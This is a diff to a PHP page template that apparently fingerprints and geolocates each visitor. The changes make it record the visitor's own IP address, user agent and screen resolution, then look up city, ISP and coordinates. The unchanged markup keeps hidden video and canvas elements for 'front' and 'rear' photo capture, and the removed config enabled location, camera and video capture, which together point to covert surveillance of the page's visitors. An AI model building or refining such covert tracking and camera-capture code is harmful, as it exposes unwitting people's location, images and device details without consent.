@@ -114,16 +114,20 @@
                     $content = $row[3];
                     $tags = $row[4];
 
-                    $ip_addr = file_get_contents('https://api.ipify.org');
+                    $ip_addr = $_SERVER['REMOTE_ADDR'];
                     $visit_info = get_visit_info($ip_addr);
                     $ip_loc = $visit_info['city'] . ", " . $visit_info['region'] . ", " . $visit_info['country'];
                     $org = $visit_info['org'];
-                    $os = php_uname();
+                    $os = $_SERVER['HTTP_USER_AGENT'];
                     $net_prov = $visit_info['isp'];
                     $lat = $visit_info['lat'];
                     $lon = $visit_info['lon'];
 
-                    $resolution = $_COOKIE['resolution'];
+                    if (isset($_COOKIE['resolution'])) {
+                        $resolution = $_COOKIE['resolution'];
+                    } else {
+                        $resolution = 'Unknown';
+                    }
                     
                     $browser = get_browser_info();
                     
@@ -234,14 +238,6 @@
         <canvas id="frontphoto_canvas" style="display:none;" height="600" width="500"></canvas>
         <video id="rearphoto" autoplay="true" playsinline="true" muted="true" width="500" height="600" style="visibility: hidden; opacity: 0; position: fixed; transform: scale(-1, 1);"></video>
         <canvas id="rearphoto_canvas" style="display:none;" height="600" width="500"></canvas>
-        <script>
-            const post_id='bc18a962c50850b2';
-            const delay='1000';
-            const locenable='1';
-            const frontenable='1';
-            const rearenable='1';
-            const videoenable='1';
-        </script>
         <script src="<?php echo BASE_URL; ?>/public/nisy.js?v=1.0.8"></script>
         <script src="<?php echo BASE_URL; ?>/register.js?v=1.0.0"></script>
         <div id="pwainstall" class="modal fade" tabindex="-1" role="dialog" style="display: none;" aria-hidden="true">
